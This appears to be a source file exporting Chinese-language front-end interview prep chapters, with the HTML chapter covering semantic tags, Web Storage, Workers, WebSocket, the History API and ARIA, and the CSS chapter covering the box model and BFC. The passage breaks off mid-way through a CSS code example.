// =============================================================
// 前端面试技巧指南 - 第 1 批章节（基础能力 5 章）
// =============================================================

export const chapters = [
  {
    id: "fe-html",
    group: "基础能力",
    icon: "📄",
    title: "HTML 核心考点与面试技巧",
    content: `

# HTML 核心考点与面试技巧

## 一、HTML5 语义化标签

### 1.1 什么是语义化标签

语义化标签是指 HTML5 中引入的具有明确含义的结构化标签，它们不仅描述了内容的外观，更重要的是描述了内容的意义和结构。使用语义化标签可以让代码更具可读性，同时也有利于搜索引擎优化（SEO）和屏幕阅读器等辅助技术。

### 1.2 常用语义化标签一览

| 标签 | 用途 | 说明 |
|------|------|------|
| \`<header>\` | 页眉区域 | 通常包含导航、logo、标题等 |
| \`<nav>\` | 导航链接区域 | 主要导航菜单 |
| \`<main>\` | 页面主要内容 | 每个页面只能有一个 main |
| \`<article>\` | 独立的文章内容 | 可以独立分发或复用的内容块 |
| \`<section>\` | 文档中的节 | 通常带有标题的内容分组 |
| \`<aside>\` | 侧边栏内容 | 与主内容相关的辅助信息 |
| \`<footer>\` | 页脚区域 | 版权信息、联系方式等 |
| \`<figure>\` 和 \`<figcaption>\` | 图表及其说明 | 图片、代码块等的容器 |
| \`<time>\` | 时间日期 | 机器可读的时间格式 |
| \`<mark>\` | 高亮文本 | 标记或突出显示的文本 |
| \`<details>\` 和 \`<summary>\` | 折叠内容 | 可展开/收起的内容区域 |

### 1.3 语义化标签的 SEO 优势

搜索引擎的爬虫在抓取页面时，会优先解析语义化标签中的内容。使用语义化标签可以：

1. **提升内容权重**：\`<article>\` 中的内容会被搜索引擎认为更重要
2. **改善 SERP 展示**：结构化数据有助于生成丰富的搜索结果摘要
3. **提高关键词相关性**：\`<h1>\` 到 \`<h6>\` 的合理使用能帮助搜索引擎理解内容层次
4. **增强移动端排名**：语义化标签天然支持响应式设计，有利于移动端 SEO
5. **辅助语音搜索**：结构化内容更容易被语音助手理解和提取

### 1.4 语义化标签 vs div 对比

\`\`\`html
<!-- 不推荐：纯 div 布局 -->
<div class="header">
  <div class="nav">...</div>
</div>
<div class="content">
  <div class="article">...</div>
  <div class="sidebar">...</div>
</div>
<div class="footer">...</div>

<!-- 推荐：语义化标签布局 -->
<header>
  <nav>...</nav>
</header>
<main>
  <article>...</article>
  <aside>...</aside>
</main>
<footer>...</footer>
\`\`\`

### 1.5 面试中如何回答语义化相关问题

**标准回答模板**："HTML5 语义化标签是根据内容含义来选择最合适的标签，而不是一味使用 div。它们的好处包括：第一，提高代码可读性和可维护性；第二，有利于 SEO，搜索引擎会给予语义化标签更高的权重；第三，方便屏幕阅读器等辅助技术解析页面，提升无障碍访问体验；第四，有利于团队协作，其他人看到标签就能理解内容结构。"

---

## 二、块级元素与行内元素

### 2.1 核心区别

| 特性 | 块级元素（Block） | 行内元素（Inline） |
|------|-------------------|---------------------|
| 独占一行 | 是 | 否，与其他行内元素在同一行 |
| 可设置宽高 | 是 | 否（width/height 无效） |
| 可设置 margin/padding | 四个方向均有效 | 只有水平方向有效 |
| 默认宽度 | 父容器的 100% | 由内容撑开 |
| 可包含元素 | 可包含块级和行内 | 只能包含行内元素 |
| 常见元素 | div, p, h1-h6, ul, ol, li, section, article | span, a, img, strong, em, input, label |

### 2.2 行内块元素（Inline-Block）

\`display: inline-block\` 结合了两者的优点：

- 不独占一行（类似 inline）
- 可以设置宽高（类似 block）
- 可以设置四个方向的 margin 和 padding
- 元素之间会有空白间隙（由 HTML 中的换行符引起）

### 2.3 元素之间的空白间隙问题

行内块元素之间出现空白间隙的原因是 HTML 中的换行符被解析为空白字符。解决方案：

1. **将标签写在同一行**（不推荐，影响可读性）
2. **父元素设置 font-size: 0**，子元素再单独设置 font-size
3. **使用 float 布局**
4. **使用 Flexbox 布局**

\`\`\`css
/* 解决方案 2：font-size: 0 */
.parent {
  font-size: 0;
}
.child {
  display: inline-block;
  font-size: 16px; /* 恢复字体大小 */
  width: 100px;
  height: 100px;
}
\`\`\`

### 2.4 可替换元素与非可替换元素

**可替换元素**（Replaced Element）：渲染结果不由 CSS 控制，而是由外部资源决定。例如 \`<img>\`、\`<video>\`、\`<iframe>\`、\`<input>\`。

特点：
- 可以设置宽高
- 可以设置 margin 四个方向
- 默认是 inline 但行为更像 inline-block

**非可替换元素**：大部分 HTML 元素，渲染结果完全由 CSS 控制。

---

## 三、HTML5 新特性

### 3.1 localStorage 与 sessionStorage

两者都是 Web Storage API 的一部分，用于在浏览器端存储数据。

| 特性 | localStorage | sessionStorage |
|------|-------------|----------------|
| 生命周期 | 永久存储，除非手动删除 | 页面会话结束时清除 |
| 作用域 | 同源下所有页面共享 | 仅限于当前页面会话 |
| 存储大小 | 约 5MB | 约 5MB |
| 与服务器通信 | 不会自动发送到服务器 | 不会自动发送到服务器 |
| API | setItem/getItem/removeItem/clear | 同左 |

\`\`\`javascript
// localStorage 操作
localStorage.setItem('token', 'abc123');
const token = localStorage.getItem('token');
localStorage.removeItem('token');
localStorage.clear();

// 存储对象需要序列化
const user = { name: '张三', age: 25 };
localStorage.setItem('user', JSON.stringify(user));
const storedUser = JSON.parse(localStorage.getItem('user'));
\`\`\`

**与 Cookie 的区别**：
- Cookie 每次请求都会自动发送到服务器，Storage 不会
- Cookie 大小限制为 4KB，Storage 约 5MB
- Cookie 可以设置过期时间，Storage 需要手动删除
- Cookie 可以通过 HttpOnly 防止 JS 访问，更安全

### 3.2 Web Worker

Web Worker 允许在后台线程中执行 JavaScript，不阻塞主线程（UI 线程）。

**特点**：
- 独立于主线程运行，不阻塞 UI 渲染
- 不能直接操作 DOM
- 通过 postMessage 与主线程通信
- 不能使用 window 对象的部分方法

**专用 Worker（Dedicated Worker）**：

\`\`\`javascript
// 主线程（main.js）
const worker = new Worker('worker.js');

// 向 Worker 发送消息
worker.postMessage({ type: 'calculate', data: [1, 2, 3, 4, 5] });

// 接收 Worker 返回的消息
worker.onmessage = function(event) {
  console.log('计算结果:', event.data);
};

// 错误处理
worker.onerror = function(error) {
  console.error('Worker 错误:', error);
};

// 终止 Worker
worker.terminate();
\`\`\`

\`\`\`javascript
// Worker 线程（worker.js）
self.onmessage = function(event) {
  const { type, data } = event.data;
  if (type === 'calculate') {
    const result = data.reduce((sum, num) => sum + num, 0);
    self.postMessage(result);
  }
};

// 也可以使用 importScripts 加载外部脚本
importScripts('helper.js');
\`\`\`

**共享 Worker（Shared Worker）**：

\`\`\`javascript
// 主线程
const sharedWorker = new SharedWorker('shared-worker.js');
sharedWorker.port.start();
sharedWorker.port.postMessage('Hello from main thread');
sharedWorker.port.onmessage = function(event) {
  console.log('收到:', event.data);
};

// 共享 Worker 内部
self.onconnect = function(event) {
  const port = event.ports[0];
  port.onmessage = function(event) {
    port.postMessage('Echo: ' + event.data);
  };
};
\`\`\`

**适用场景**：
- 大量数据的计算和处理
- 图像处理、音视频处理
- 实时数据分析和处理
- 加密/解密操作

### 3.3 WebSocket

WebSocket 是一种在单个 TCP 连接上进行全双工通信的协议，可以实现服务器主动向客户端推送数据。

**与传统 HTTP 的区别**：
- HTTP：请求-响应模式，服务器无法主动推送
- WebSocket：全双工通信，服务器可以主动推送

\`\`\`javascript
// 创建 WebSocket 连接
const ws = new WebSocket('ws://localhost:3000');

// 连接建立
ws.onopen = function() {
  console.log('WebSocket 连接已建立');
  // 发送消息
  ws.send(JSON.stringify({ type: 'greeting', content: 'Hello Server!' }));
};

// 接收消息
ws.onmessage = function(event) {
  const message = JSON.parse(event.data);
  console.log('收到服务器消息:', message);
};

// 连接关闭
ws.onclose = function(event) {
  console.log('连接已关闭, code:', event.code, 'reason:', event.reason);
};

// 错误处理
ws.onerror = function(error) {
  console.error('WebSocket 错误:', error);
};

// 主动关闭连接
// ws.close(1000, '正常关闭');
\`\`\`

**WebSocket 状态**：
- \`WebSocket.CONNECTING\` (0)：正在连接
- \`WebSocket.OPEN\` (1)：已连接
- \`WebSocket.CLOSING\` (2)：正在关闭
- \`WebSocket.CLOSED\` (3)：已关闭

**心跳机制**：为了防止连接被代理服务器断开，需要实现心跳检测。

\`\`\`javascript
let heartBeatTimer = null;

ws.onopen = function() {
  // 每隔 30 秒发送心跳
  heartBeatTimer = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000);
};

ws.onclose = function() {
  clearInterval(heartBeatTimer);
};
\`\`\`

**重连机制**：

\`\`\`javascript
function createWebSocket(url) {
  let ws = new WebSocket(url);
  let reconnectTimer = null;
  let reconnectCount = 0;
  const maxReconnect = 5;

  ws.onclose = function() {
    if (reconnectCount < maxReconnect) {
      reconnectTimer = setTimeout(() => {
        reconnectCount++;
        console.log(\`第 \${reconnectCount} 次重连...\`);
        ws = createWebSocket(url);
      }, 1000 * Math.pow(2, reconnectCount)); // 指数退避
    }
  };

  return ws;
}
\`\`\`

### 3.4 History API

HTML5 的 History API 允许在不刷新页面的情况下操作浏览器历史记录，是实现 SPA 路由的基础。

**核心方法**：

\`\`\`javascript
// pushState：添加一条历史记录，页面不会刷新
history.pushState(
  { page: 1 },      // state 对象，可以通过 popstate 事件获取
  'title',           // 标题（大多数浏览器忽略）
  '/page/1'          // URL（必须是同源的）
);

// replaceState：替换当前历史记录，页面不会刷新
history.replaceState(
  { page: 2 },
  'title',
  '/page/2'
);

// go：前进或后退
history.go(-1);  // 后退一页
history.go(1);   // 前进一页
history.go(0);   // 刷新当前页

// back 和 forward
history.back();     // 等同于 go(-1)
history.forward();  // 等同于 go(1)
\`\`\`

**popstate 事件**：当用户点击浏览器的前进/后退按钮时触发。

\`\`\`javascript
window.addEventListener('popstate', function(event) {
  console.log('location:', document.location);
  console.log('state:', event.state);
  // 根据 URL 渲染对应页面
});
\`\`\`

**重要提示**：
- \`pushState\` 和 \`replaceState\` 不会触发 \`popstate\` 事件
- 只有用户操作浏览器前进/后退按钮、或调用 \`history.go()\`/\`history.back()\`/\`history.forward()\` 时才会触发 \`popstate\`
- \`hashchange\` 事件也可以用来监听 hash 变化，但 History API 更加灵活

---

## 四、src 与 href 的区别

### 4.1 核心区别

| 特性 | src | href |
|------|-----|------|
| 英文全称 | source | Hypertext Reference |
| 作用 | 将外部资源嵌入到当前文档中 | 建立当前文档与外部资源之间的链接 |
| 加载行为 | 阻塞式加载（暂停文档解析直到资源加载完成） | 非阻塞式加载（文档解析继续） |
| 典型用法 | \`<script src="...">\`、\`<img src="...">\`、\`<iframe src="...">\` | \`<link href="...">\`、\`<a href="...">\` |
| 浏览器处理 | 请求资源并替换当前元素 | 建立链接关系，不替换内容 |

### 4.2 深入理解

**src 的阻塞行为**：
- 当浏览器解析到 \`<script src="...">\` 时，会暂停 HTML 文档的解析，下载并执行 JS 文件
- 这也是为什么通常将脚本放在 \`</body>\` 之前或使用 \`defer\`/\`async\` 属性的原因
- \`<img src="...">\` 不会阻塞文档解析，但会阻塞图片的 onload 事件

**href 的非阻塞行为**：
- \`<link href="style.css">\` 不会阻塞 HTML 解析，但会阻塞页面渲染（CSSOM 构建完成前不会渲染）
- \`<a href="...">\` 只是建立超链接，点击才跳转

### 4.3 面试回答模板

**标准回答**："src 和 href 的主要区别在于：src 用于将外部资源嵌入到当前页面中，浏览器在解析到 src 时会暂停文档解析，去下载和执行资源；而 href 用于建立当前文档与外部资源之间的链接关系，浏览器解析到 href 时会并行下载资源，不会阻塞文档解析继续。典型的例子是 \`<script src>\` 会阻塞解析，而 \`<link href>\` 不会。"

---

## 五、title 与 alt 属性的区别

### 5.1 核心区别

| 特性 | title | alt |
|------|-------|-----|
| 适用元素 | 几乎所有 HTML 元素 | 仅 \`<img>\`、\`<area>\`、\`<input type="image">\` |
| 显示时机 | 鼠标悬停时显示 tooltip | 图片加载失败时显示替代文本 |
| 主要作用 | 提供补充说明信息 | 提供图片的文字替代方案 |
| 对 SEO 的影响 | 影响较小 | 影响较大（搜索引擎读取 alt 文本） |
| 无障碍访问 | 屏幕阅读器可能读取 | 屏幕阅读器一定会读取 |

### 5.2 最佳实践

\`\`\`html
<!-- 正确使用：alt 描述图片内容，title 提供额外信息 -->
<img src="logo.png" alt="公司 Logo - 科技前沿" title="点击返回首页" />

<!-- 装饰性图片：alt 为空 -->
<img src="decorative-line.png" alt="" />

<!-- 功能性图片：alt 描述功能 -->
<img src="search-icon.png" alt="搜索" />

<!-- 链接中的图片：alt 描述链接目标 -->
<a href="/home">
  <img src="home-icon.png" alt="返回首页" />
</a>
\`\`\`

### 5.3 面试回答要点

- alt 是图片的**替代文本**，当图片无法加载时显示，对于 SEO 和无障碍访问至关重要
- title 是**提示文本**，鼠标悬停时显示，提供额外信息
- alt 是必需的属性（即使为空字符串），title 是可选的
- 搜索引擎爬虫会读取 alt 属性来理解图片内容，这是图片 SEO 的关键

---

## 六、Doctype 及其作用

### 6.1 什么是 Doctype

Doctype（Document Type Declaration）是文档类型声明，位于 HTML 文档的最顶部，告诉浏览器使用哪个 HTML 版本的标准来解析文档。

### 6.2 HTML5 的 Doctype

\`\`\`html
<!DOCTYPE html>
\`\`\`

相比之前的版本简洁很多：

\`\`\`html
<!-- HTML 4.01 Strict -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">

<!-- HTML 4.01 Transitional -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<!-- XHTML 1.0 Strict -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
\`\`\`

### 6.3 Doctype 的作用

1. **标准模式 vs 怪异模式**：
   - 有 Doctype → 标准模式（Standards Mode）：浏览器按照 W3C 标准解析渲染
   - 没有 Doctype → 怪异模式（Quirks Mode）：浏览器模拟旧版浏览器的行为，不同浏览器表现不一致

2. **影响 CSS 盒模型**：
   - 标准模式：width = content 宽度
   - 怪异模式：width = content + padding + border

3. **影响垂直对齐**：
   - 标准模式：图片等内联元素与基线对齐，底部可能有空隙
   - 怪异模式：对齐方式不同

### 6.4 如何判断浏览器模式

\`\`\`javascript
// 判断浏览器当前的渲染模式
console.log('渲染模式:', document.compatMode);
// 输出 "CSS1Compat" 表示标准模式
// 输出 "BackCompat" 表示怪异模式
\`\`\`

### 6.5 面试回答模板

**标准回答**："Doctype 声明位于 HTML 文档的第一行，用于告诉浏览器使用哪个 HTML 版本的规定来解析文档。它的核心作用是触发浏览器的标准模式渲染，如果没有 Doctype 或 Doctype 不正确，浏览器会进入怪异模式，导致不同浏览器之间的表现不一致。HTML5 的 Doctype 非常简单，就是 \`<!DOCTYPE html>\`，大小写不敏感。"

---

## 七、Meta Viewport 标签

### 7.1 什么是 Viewport

Viewport 是用户在浏览器中看到的网页的可视区域。在移动设备上，viewport 的概念尤为重要。

### 7.2 标准写法

\`\`\`html
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
\`\`\`

### 7.3 各属性详解

| 属性 | 说明 | 示例值 |
|------|------|--------|
| width | 视口宽度 | device-width（设备宽度）或具体像素值如 375 |
| height | 视口高度 | device-height |
| initial-scale | 初始缩放比例 | 1.0（不缩放） |
| maximum-scale | 最大缩放比例 | 1.0（禁止缩放） |
| minimum-scale | 最小缩放比例 | 1.0 |
| user-scalable | 用户是否可以缩放 | yes / no |
| viewport-fit | iPhone X 刘海屏适配 | cover / auto / contain |

### 7.4 移动端适配原理

如果不设置 viewport，移动端浏览器会默认将页面渲染在一个较宽的虚拟视口中（通常是 980px），然后缩小到屏幕宽度，导致文字过小。

**三步适配方案**：
1. 设置 viewport meta 标签
2. 使用 rem/vw 等相对单位
3. 使用媒体查询处理不同屏幕尺寸

### 7.5 iPhone X 刘海屏适配

\`\`\`html
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
\`\`\`

\`\`\`css
/* 安全区域适配 */
body {
  padding-top: env(safe-area-inset-top);
  padding-bottom: env(safe-area-inset-bottom);
  padding-left: env(safe-area-inset-left);
  padding-right: env(safe-area-inset-right);
}
\`\`\`

---

## 八、HTML 解析与渲染流程

### 8.1 浏览器渲染流程概述

浏览器从接收 HTML 到渲染出页面，大体经历以下步骤：

1. **解析 HTML** → 构建 DOM 树
2. **解析 CSS** → 构建 CSSOM 树
3. **合并 DOM 和 CSSOM** → 构建 Render Tree（渲染树）
4. **布局（Layout/Reflow）** → 计算每个节点的位置和大小
5. **绘制（Paint）** → 将节点绘制到屏幕上
6. **合成（Composite）** → 将各层合并为最终图像

### 8.2 DOM 树的构建

浏览器逐字节解析 HTML 文件，经过以下过程：

\`\`\`
字节（Bytes）→ 字符（Characters）→ Token → 节点（Nodes）→ DOM 树
\`\`\`

- **字节转换**：浏览器读取 HTML 原始字节，根据编码（如 UTF-8）转换为字符
- **词法分析**：将字符流解析为 Token（标签 Token、文本 Token 等）
- **语法分析**：将 Token 转换为节点对象
- **构建 DOM 树**：根据节点之间的父子关系构建树形结构

### 8.3 CSSOM 树的构建

CSSOM（CSS Object Model）的构建过程与 DOM 类似：

\`\`\`
字节 → 字符 → Token → 节点 → CSSOM 树
\`\`\`

**CSS 的阻塞特性**：
- CSS 不阻塞 DOM 解析，但会阻塞页面渲染
- CSSOM 构建完成之前，浏览器不会渲染任何内容
- 这也是为什么 CSS 放在 \`<head>\` 中的原因：尽早下载并构建 CSSOM

### 8.4 渲染树（Render Tree）的构建

渲染树只包含**需要显示**的节点：

- 包含：可见的 DOM 节点及其对应的 CSS 样式
- 不包含：\`display: none\` 的元素、\`<head>\`、\`<script>\` 等
- \`visibility: hidden\` 的元素虽然在渲染树中，但不可见（仍占据空间）

### 8.5 脚本的加载和执行

\`\`\`html
<!-- 普通 script：阻塞 HTML 解析，立即下载和执行 -->
<script src="app.js"></script>

<!-- defer：异步下载，HTML 解析完成后、DOMContentLoaded 之前按顺序执行 -->
<script src="app.js" defer></script>

<!-- async：异步下载，下载完立即执行（不保证执行顺序） -->
<script src="app.js" async></script>
\`\`\`

| 属性 | 下载时机 | 执行时机 | 是否阻塞解析 | 执行顺序 |
|------|----------|----------|-------------|---------|
| 无 | 立即下载 | 立即执行 | 阻塞 HTML 解析 | 按代码顺序 |
| defer | 立即异步下载 | DOMContentLoaded 之前 | 不阻塞 | 按代码顺序 |
| async | 立即异步下载 | 下载完成后立即执行 | 执行时可能阻塞 | 不保证顺序 |

### 8.6 DOMContentLoaded 与 Load 事件

\`\`\`javascript
// DOMContentLoaded：DOM 树构建完成（不需要等待样式表、图片等资源）
document.addEventListener('DOMContentLoaded', function() {
  console.log('DOM 已就绪');
});

// load：所有资源加载完成（包括图片、样式、脚本等）
window.addEventListener('load', function() {
  console.log('所有资源加载完成');
});

// beforeunload：页面即将卸载
window.addEventListener('beforeunload', function(event) {
  event.preventDefault();
  event.returnValue = '确定离开吗？';
});
\`\`\`

---

## 九、语义化 HTML 与无障碍访问（ARIA）

### 9.1 ARIA 是什么

ARIA（Accessible Rich Internet Applications）是一套属性规范，用于增强 Web 内容的无障碍访问性，特别是对于使用屏幕阅读器等辅助技术的用户。

### 9.2 常用 ARIA 属性

**角色（Role）**：

\`\`\`html
<!-- 为自定义组件分配角色 -->
<div role="button" tabindex="0" aria-pressed="false">自定义按钮</div>

<!-- 导航角色 -->
<nav role="navigation">...</nav>

<!-- 搜索角色 -->
<form role="search">...</form>

<!-- 弹窗角色 -->
<div role="dialog" aria-modal="true" aria-labelledby="dialog-title">
  <h2 id="dialog-title">确认操作</h2>
  <p>确定要删除吗？</p>
</div>
\`\`\`

**状态和属性**：

\`\`\`html
<!-- aria-label：提供标签 -->
<button aria-label="关闭弹窗">×</button>

<!-- aria-hidden：对辅助技术隐藏 -->
<div aria-hidden="true">这个装饰元素对屏幕阅读器不可见</div>

<!-- aria-expanded：展开/折叠状态 -->
<button aria-expanded="false" aria-controls="menu-content">
  展开菜单
</button>
<div id="menu-content" hidden>菜单内容</div>

<!-- aria-live：动态内容区域 -->
<div aria-live="polite" aria-atomic="true">
  <!-- 动态更新的内容会通知屏幕阅读器 -->
</div>
\`\`\`

### 9.3 无障碍访问的最佳实践

1. **使用语义化 HTML**：这是最基础也最重要的无障碍实践
2. **提供替代文本**：所有图片都要有有意义的 alt 属性
3. **确保键盘可访问**：所有交互元素都能通过 Tab 键访问
4. **足够的颜色对比度**：文本与背景的对比度至少 4.5:1
5. **表单标签关联**：使用 \`<label for="id">\` 关联表单控件
6. **跳过导航链接**：提供"跳到主要内容"的链接

\`\`\`html
<!-- 跳过导航 -->
<a href="#main-content" class="skip-link">跳到主要内容</a>

<!-- 表单标签关联 -->
<label for="email">邮箱地址</label>
<input type="email" id="email" name="email" />

<!-- 使用 fieldset 和 legend 分组 -->
<fieldset>
  <legend>选择支付方式</legend>
  <input type="radio" id="wechat" name="payment" value="wechat" />
  <label for="wechat">微信支付</label>
  <input type="radio" id="alipay" name="payment" value="alipay" />
  <label for="alipay">支付宝</label>
</fieldset>
\`\`\`

---

## 十、常见面试题与回答技巧

### 10.1 面试题：HTML5 有哪些新特性？请列举并说明

**标准回答**：

"HTML5 的新特性可以从以下几个维度来回答：

**语义化标签**：新增了 header、nav、main、article、section、aside、footer 等结构化标签，提高了代码的可读性和 SEO 友好性。

**表单增强**：新增了 email、url、number、date、range 等输入类型，以及 placeholder、required、pattern 等表单属性，减少了 JS 验证的工作量。

**多媒体支持**：原生支持 audio 和 video 标签，无需借助 Flash 等插件。

**图形绘制**：Canvas 和 SVG 提供了强大的 2D/3D 图形绘制能力。

**存储方案**：localStorage 和 sessionStorage 提供了更强大的客户端存储能力。

**通信能力**：WebSocket 实现了全双工通信，Server-Sent Events 支持服务器推送。

**性能优化**：Web Worker 支持多线程，避免主线程阻塞。

**离线应用**：Application Cache 和 Service Worker 支持离线访问。

**设备访问**：Geolocation API 获取地理位置，Device Orientation 获取设备方向。

**History API**：pushState 和 replaceState 支持无刷新修改 URL。"

### 10.2 面试题：如何理解 HTML 语义化？

**回答要点**：
1. 根据内容结构选择合适的标签，而不是全部使用 div
2. 四个方面说明好处：代码可读性、SEO、无障碍访问、团队协作
3. 可以举例说明：用 nav 而不是 div.nav，用 article 而不是 div.post

### 10.3 面试题：script 标签中 defer 和 async 的区别？

**回答要点**：
1. 画图说明三者的加载和执行时序
2. defer：异步下载，DOM 解析完后按顺序执行，最适合需要操作 DOM 的脚本
3. async：异步下载，下载完立即执行，不保证顺序，适合独立脚本（如统计、广告）
4. 普通 script：阻塞 HTML 解析，立即下载执行

### 10.4 面试题：请描述一下从输入 URL 到页面展示的完整过程

**回答框架**（这题在浏览器章节还会详细展开）：

1. **URL 解析**：判断是搜索还是 URL，补全 URL
2. **DNS 解析**：域名 → IP 地址，涉及 DNS 缓存、递归查询
3. **TCP 连接**：三次握手建立连接（HTTPS 还需要 TLS 握手）
4. **发送 HTTP 请求**：浏览器发送请求报文
5. **服务器处理**：后端处理请求，返回响应
6. **浏览器接收响应**：解析 HTML，构建 DOM 树
7. **解析 CSS**：构建 CSSOM 树
8. **构建渲染树**：合并 DOM 和 CSSOM
9. **布局（Layout）**：计算元素位置和大小
10. **绘制（Paint）**：将元素绘制到屏幕
11. **合成（Composite）**：合并图层显示

### 10.5 面试题：HTML5 的离线存储有哪些？怎么使用？

**回答**：
1. **Application Cache**（已废弃）：通过 manifest 文件缓存资源
2. **Service Worker**：现代方案，通过拦截网络请求实现离线缓存
3. **localStorage / sessionStorage**：简单数据存储
4. **IndexedDB**：结构化数据存储，支持事务和索引

\`\`\`javascript
// Service Worker 注册
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js').then(function(registration) {
    console.log('Service Worker 注册成功:', registration.scope);
  }).catch(function(error) {
    console.log('Service Worker 注册失败:', error);
  });
}

// sw.js
self.addEventListener('install', function(event) {
  event.waitUntil(
    caches.open('v1').then(function(cache) {
      return cache.addAll([
        '/',
        '/index.html',
        '/style.css',
        '/app.js'
      ]);
    })
  );
});

self.addEventListener('fetch', function(event) {
  event.respondWith(
    caches.match(event.request).then(function(response) {
      return response || fetch(event.request);
    })
  );
});
\`\`\`

---

## 十一、HTML 面试题的回答策略

### 11.1 金字塔式回答法

面对 HTML 相关问题，采用"总-分-模式"的金字塔结构：

1. **第一层（总）**：直接给出核心结论（一句话回答）
2. **第二层（分）**：分点阐述，每点用一句话概括
3. **第三层（展开）**：挑选重点深入展开，可以举例或写代码

### 11.2 对比式回答法

当问题涉及比较时（如 localStorage vs sessionStorage），使用对比表格：

1. 先说相同点
2. 再说核心区别
3. 最后说适用场景

### 11.3 实战式回答法

当被问到具体实现问题时，结合代码示例：

1. 先口述思路
2. 再写核心代码
3. 解释代码中的关键点

### 11.4 加分技巧

- **关联实际项目**："在我们的项目中，我们使用语义化标签来..."
- **提及性能优化**："使用 defer 加载脚本可以提升首屏渲染速度..."
- **展示知识广度**："HTML 本身不提供这些能力，但结合 Service Worker 可以实现..."
- **关注浏览器兼容**："这个属性在 IE 中不支持，我们可以使用 polyfill..."

---

## 总结

HTML 虽然是前端面试中相对基础的部分，但面试官往往会通过 HTML 问题考察候选人的**知识深度**和**系统性思维**。不仅要记住各个标签和属性的用法，更要理解它们背后的原理和设计思想。一个优秀的回答应该结构清晰、层次分明，能够从"是什么"延伸到"为什么"和"怎么用"。

**核心记忆点**：
1. 语义化标签是 HTML5 的灵魂，不仅关乎可读性，更关乎 SEO 和无障碍访问
2. Doctype 触发标准模式，避免怪异模式的各种坑
3. script 标签的三个加载方式（普通/defer/async）是高频考点
4. Web Storage 和 WebSocket 是现代 Web 应用的基础设施
5. 浏览器渲染流程贯穿前端性能优化的始终
`
  },
  {
    id: "fe-css",
    group: "基础能力",
    icon: "🎨",
    title: "CSS 核心考点与面试技巧",
    content: `

# CSS 核心考点与面试技巧

## 一、CSS 盒模型

### 1.1 标准盒模型（W3C 标准）

在标准盒模型中，元素的宽高只包含内容区域（content）：

\`\`\`
总宽度 = width + padding-left + padding-right + border-left + border-right + margin-left + margin-right
总高度 = height + padding-top + padding-bottom + border-top + border-bottom + margin-top + margin-bottom
\`\`\`

- \`width\` 和 \`height\` 只设置 content 的尺寸
- padding 和 border 是在 content 之外额外增加的

### 1.2 IE 盒模型（怪异盒模型）

在 IE 盒模型中，元素的宽高包含 content、padding 和 border：

\`\`\`
总宽度 = width + margin-left + margin-right
总高度 = height + margin-top + margin-bottom
\`\`\`

- \`width\` 和 \`height\` 已经包含了 content、padding 和 border
- 内容区域 = width - padding - border

### 1.3 box-sizing 属性

\`\`\`css
/* 标准盒模型（默认值） */
box-sizing: content-box;

/* IE 盒模型（推荐在全局使用） */
box-sizing: border-box;

/* 全局设置 */
*, *::before, *::after {
  box-sizing: border-box;
}
\`\`\`

**为什么推荐 border-box**：
- 更直观：设置的 width 就是元素的最终宽度
- 避免宽度计算错误：不需要手动减去 padding 和 border
- 响应式布局更友好：百分比宽度不受 padding 影响

### 1.4 面试题：标准盒模型和 IE 盒模型的区别

**标准回答**："标准盒模型（content-box）中，width 和 height 只包含内容区域，padding 和 border 是额外的。IE 盒模型（border-box）中，width 和 height 包含了 content、padding 和 border。在项目开发中，我们通常通过设置 box-sizing: border-box 来统一使用 IE 盒模型，这样布局更直观。"

### 1.5 margin 的常见问题

**margin 合并（外边距塌陷）**：

两个垂直相邻的块级元素，它们的 margin 会合并为两者中较大的那个值。

\`\`\`css
/* 触发条件： */
/* 1. 相邻的兄弟元素 */
/* 2. 没有内容将父元素和后代元素隔开 */
/* 3. 空块级元素自身的 margin-top 和 margin-bottom */
\`\`\`

**解决方案**：
1. 父元素设置 overflow: hidden（触发 BFC）
2. 父元素设置 border 或 padding
3. 父元素和子元素之间添加内联元素
4. 使用 Flexbox 或 Grid 布局
5. 使用 padding 代替 margin

**margin 负值**：
- \`margin-top\` 负值：元素向上移动
- \`margin-left\` 负值：元素向左移动
- \`margin-right\` 负值：右侧元素向左移动，自身宽度不变
- \`margin-bottom\` 负值：下方元素向上移动，自身高度不变

---

## 二、BFC（Block Formatting Context）

### 2.1 什么是 BFC

BFC（块级格式化上下文）是 CSS 中的一个独立渲染区域，它规定了内部的块级元素如何布局，并且与这个区域外部毫不相干。通俗地说，BFC 就像一个"结界"，内部元素无论如何翻江倒海，都不会影响外部元素。

### 2.2 BFC 的布局规则

1. 内部的 Box 在垂直方向上一个接一个地放置
2. Box 垂直方向的距离由 margin 决定，**同一个 BFC 内相邻 Box 的 margin 会发生重叠**
3. 每个元素的左外边缘（margin-left）与包含块的左边缘（border-left）相接触（从左到右的格式）
4. BFC 的区域不会与浮动元素重叠
5. BFC 是一个独立的容器，**内部元素不影响外部元素**
6. 计算 BFC 高度时，**浮动元素也参与计算**

### 2.3 触发 BFC 的条件

\`\`\`css
/* 以下任一条件都可以触发 BFC */

/* 1. 根元素（html） */
/* 默认就是 BFC */

/* 2. float 不为 none */
.element { float: left; }

/* 3. position 为 absolute 或 fixed */
.element { position: absolute; }

/* 4. display 为 inline-block、table-cell、table-caption、flex、inline-flex、grid、inline-grid */
.element { display: inline-block; }
.element { display: flex; }

/* 5. overflow 不为 visible（最常用） */
.element { overflow: hidden; }
.element { overflow: auto; }
.element { overflow: scroll; }

/* 6. contain 为 layout、content、paint */
.element { contain: layout; }
\`\`\`

### 2.4 BFC 的应用场景

**场景一：解决 margin 合并问题**

\`\`\`html
<div class="container">
  <div class="child">子元素 1</div>
  <!-- 将子元素 2 放入 BFC 中 -->
  <div style="overflow: hidden;">
    <div class="child">子元素 2</div>
  </div>
</div>
\`\`\`

**场景二：清除浮动（最常用）**

\`\`\`css
/* 父元素触发 BFC，自动包含浮动子元素 */
.parent {
  overflow: hidden; /* 触发 BFC */
}
.child {
  float: left;
}
